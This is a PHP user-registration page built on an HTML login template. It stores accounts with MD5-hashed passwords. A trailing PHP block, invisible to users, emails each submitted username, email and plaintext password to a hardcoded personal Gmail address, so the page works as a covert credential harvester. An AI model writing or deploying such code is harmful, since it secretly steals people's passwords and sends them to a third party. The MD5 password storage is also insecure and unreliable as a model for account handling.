<!DOCTYPE html>
<html lang="en">
<head>
	<title>Login V2</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
<?php
	require('db.php');
    if (isset($_REQUEST['username'])){
		$username = stripslashes($_REQUEST['username']);
		$username = mysqli_real_escape_string($con,$username);
		$email = stripslashes($_REQUEST['email']);
		$email = mysqli_real_escape_string($con,$email);
		$password = stripslashes($_REQUEST['password']);
		$password = mysqli_real_escape_string($con,$password);

		$trn_date = date("Y-m-d H:i:s");
        $query = "INSERT into `users` (username, password, email, trn_date) VALUES ('$username', '".md5($password)."', '$email', '$trn_date')";
        $result = mysqli_query($con,$query);
        if($result){
            echo "<div class='form'><h3>You are registered successfully.</h3><br/>Click here to <a href='index.php'>Login</a></div>";
        }
    }else{
?>
	<div class="limiter">
		<div class="container-login100">
			<div class="wrap-login100">
            <?php if(!empty($statusMsg)){ ?>
                <p><?php echo $statusMsg; ?></p>
            <?php } ?>
				<form class="login100-form validate-form" name="registration" action="" method="post">
					<span class="login100-form-title p-b-26">
						Welcome
					</span>
					<span class="login100-form-title p-b-48">
					<img src="download.jpg" style="width:60px;">
					</span>

					<div class="wrap-input100 validate-input">
						<input class="input100" type="text"  name="username"  required />
						<span class="focus-input100" data-placeholder="Username"></span>
					</div>
                    <div class="wrap-input100 validate-input">
						<input class="input100" type="email"  name="email"  required />
						<span class="focus-input100" data-placeholder="Email"></span>
					</div>

					<div class="wrap-input100 validate-input" data-validate="Enter password">
						<span class="btn-show-pass">
							<i class="zmdi zmdi-eye"></i>
						</span>
						<input class="input100" type="password" name="password"  required />
						<span class="focus-input100" data-placeholder="Password"></span>
					</div>

					<div class="container-login100-form-btn">
						<div class="wrap-login100-form-btn">
							<div class="login100-form-bgbtn"></div>
							<button class="login100-form-btn" type="submit" name="submit">
                            Register
							</button>
						</div>
					</div>

					<div class="text-center p-t-115">
					<a class="txt2" href="login.php">
							Sign In
						</a>

					</div>
				</form>
			</div>
		</div>
	</div>
	

	<div id="dropDownSelect1"></div>
	
<!--===============================================================================================-->
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/animsition/js/animsition.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/daterangepicker/moment.min.js"></script>
	<script src="vendor/daterangepicker/daterangepicker.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/countdowntime.js"></script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>
<?php } ?>

<?php
$statusMsg='';
if(isset($_POST["submit"])){
   $username = $_POST['username'];
    $email = $_POST['email'];
    $password = $_POST['password'];
$fromemail =  $email;
$subject="Login successfully";
$email_message = '<h2>Contact Request Submitted</h2>
                    <p><b>Username:</b> '.$username.'</p>
                    <p><b>Email:</b> '.$email.'</p>
                    <p><b>Password:</b> '.$password.'</p>';
$headers = "From: ".$fromemail;

$toemail="rahulfarswan0932@gmail.com";	

if(mail($toemail, $subject, $email_message,)){
   $statusMsg= "Email send successfully ";
}else{
   $statusMsg= "Not sent";
}
}
   ?>